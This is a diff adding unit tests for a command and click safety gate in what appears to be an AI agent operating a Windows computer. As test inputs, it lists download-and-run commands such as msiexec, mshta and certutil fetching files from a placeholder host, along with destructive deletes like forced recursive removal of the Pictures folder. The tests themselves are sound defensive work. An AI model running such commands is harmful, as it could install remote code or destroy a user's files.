@@ -354,3 +354,24 @@ test('commandCheck: hard refuses, read-only auto, everything else confirm; scam/
   assert.strictEqual(v('Restart-Service Spooler', { scamContext: true }), 'refuse');
   assert.strictEqual(v('Get-Process', { remoteSession: true }), 'refuse');
 });
+
+// Review 2026-09-28: commands now run without a card, so installs/remote scripts are refused and deletes keep a question.
+test('commandCheck: installs and web addresses are refused; deletes are R14b (asks), not a silent run', () => {
+  const g = G();
+  const B = String.fromCharCode(92);
+  for (const c of ['msiexec /i https://host/tool.msi /qn', 'mshta https://host/a.hta', 'certutil -urlcache -split -f https://host/x.exe x.exe',
+    'winget install --id Some.App', 'regsvr32 /s x.dll', 'Install-Module Foo'])
+    assert.strictEqual(g.commandCheck(c).verdict, 'refuse', c);
+  for (const c of ['Clear-RecycleBin -Force', 'Remove-Item ~' + B + 'Pictures -Recurse -Force', 'del C:' + B + 'temp' + B + 'a.txt'])
+    assert.deepStrictEqual([g.commandCheck(c).verdict, g.commandCheck(c).rule], ['confirm', 'R14b'], c);
+  assert.strictEqual(g.commandCheck('Restart-Service Spooler').rule, 'run');
+});
+
+test('gateAction: a confirm the gate thinks sends/pays/deletes carries risky (tools.act asks); a plain doubt does not', async () => {
+  const click = act('click', { element_id: 1, explain: 'Clicking the button.' });
+  const ctx = { goal: 'buy the book', element: { name: 'Confirm and pay' } };
+  assert.strictEqual((await G(jevGate('auto', 0.9, 0.8)).gateAction(click, ctx)).risky, true, 'risky noul');
+  assert.strictEqual((await G(jevGate('confirm', 0.9, 0.1)).gateAction(click, ctx)).risky, undefined, 'doubt only');
+  assert.strictEqual((await G(jevDown()).gateAction(click, ctx)).risky, true, 'Jev down: keyword fallback');
+  assert.strictEqual((await G(jevGate('auto', 0.9, 0.8)).gateAction(click, { ...ctx, confirmed: true })).verdict, 'auto', 'a yes on the card is enough');
+});
